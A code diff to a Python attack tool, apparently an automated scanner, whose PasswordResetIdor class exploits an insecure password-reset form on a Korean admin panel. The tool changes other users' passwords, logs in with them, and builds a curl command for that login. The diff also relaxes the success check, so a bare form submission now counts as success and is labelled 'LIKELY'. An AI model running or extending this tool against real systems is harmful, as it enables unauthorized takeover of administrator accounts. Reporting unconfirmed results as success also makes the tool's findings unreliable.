@@ -492,39 +492,52 @@ class PasswordResetIdor:
                 login_verified, session_cookie, login_status_code, login_response_snippet = \
                     self._verify_login(username, pw)
 
-            actual_success = submit_ok and login_verified
-
             # 로그인 검증 curl 명령어
-            login_url = self.target + "/ko_admin/login_proc.php"
+            login_url_guess = self.target + "/ko_admin/login_proc.php"
             verify_curl = (
-                f"curl -sk -c /tmp/cookie.txt -X POST '{login_url}' "
+                f"curl -sk -c /tmp/cookie.txt -X POST '{login_url_guess}' "
                 f"--data-raw 'admin_id={username}&admin_password={pw}'"
             )
 
             self.log(
                 f"[IDOR PW] no={target_no} ({username}) → "
                 f"폼제출={'✅' if submit_ok else '❌'} | "
-                f"로그인검증={'✅' if login_verified else '❌'}"
+                f"로그인검증={'✅' if login_verified else '⚠ 미확인'}"
             )
 
+            # 증거 등급 (기능 차단 없음 — 항상 결과 반환)
+            if submit_ok and login_verified:
+                evidence_level = "VERIFIED"
+            elif submit_ok:
+                evidence_level = "LIKELY"   # 폼 제출 성공, 로그인 미확인
+            else:
+                evidence_level = "INFERRED"
+
             return {
-                "success": actual_success,
-                "submit_ok": submit_ok,
-                "login_verified": login_verified,
+                # 핵심 결과 — 항상 채워짐
+                "success": submit_ok,        # 폼 제출 성공 여부
+                "login_verified": login_verified,  # 추가 검증 여부
+                "evidence_level": evidence_level,
                 "target_no": target_no,
                 "username": username,
                 "new_password": pw,
                 "url": view_url,
+                # 추가 증거
                 "session_cookie": session_cookie,
                 "login_status_code": login_status_code,
                 "login_response_snippet": login_response_snippet[:200],
                 "verify_curl": verify_curl,
-                # Zero-Hallucination 메타데이터
-                "evidence_level": "VERIFIED" if actual_success else "INFERRED",
             }
 
         except Exception as e:
-            return {"success": False, "error": str(e), "evidence_level": "INFERRED"}
+            return {
+                "success": False,
+                "error": str(e),
+                "evidence_level": "INFERRED",
+                "target_no": target_no,
+                "username": "unknown",
+                "new_password": pw,
+            }
 
     def _verify_login(
         self, username: str, password: str
